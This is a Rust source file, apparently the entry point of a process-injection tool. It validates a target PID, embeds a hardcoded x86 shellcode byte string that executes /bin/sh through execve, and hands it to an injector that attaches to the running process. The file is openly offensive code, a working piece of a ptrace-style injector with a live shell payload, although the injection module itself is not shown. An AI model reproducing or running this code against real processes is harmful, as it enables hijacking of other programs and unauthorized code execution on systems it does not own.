#[macro_use]
extern crate clap;

mod injection;
use std::process::exit;

fn main() {
    let yaml = load_yaml!("options.yml");
    let args = clap::App::from_yaml(yaml).get_matches();
    let target_pid = args
        .value_of("pid")
        .unwrap()
        .parse::<i32>()
        .unwrap_or_else(|e| {
            eprintln!("received the invalid pid. {}", e);
            println!("{}", args.usage());
            exit(1);
        });

    let pid_max = procfs::sys::kernel::pid_max().unwrap();
    if target_pid == 0 || target_pid > pid_max {
        eprintln!("received the invalid pid. (pid_max is {})", pid_max);
        println!("{}", args.usage());
        exit(1);
    }

    let shellcode = b"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
        .iter()
        .map(|x| *x)
        .collect::<Vec<u8>>();
    let injector = injection::Injector::new(target_pid, shellcode).unwrap_or_else(|e| {
        eprintln!("Cannot create injector object. {}", e);
        exit(1)
    });

    match injector.attach() {
        Ok(_) => println!("[+] attached to process (pid: {})", target_pid),
        Err(e) => {
            eprintln!("[-] failure attach to process (pid: {}). {}", target_pid, e);
            exit(1);
        }
    }

    injector.detach().unwrap();
}
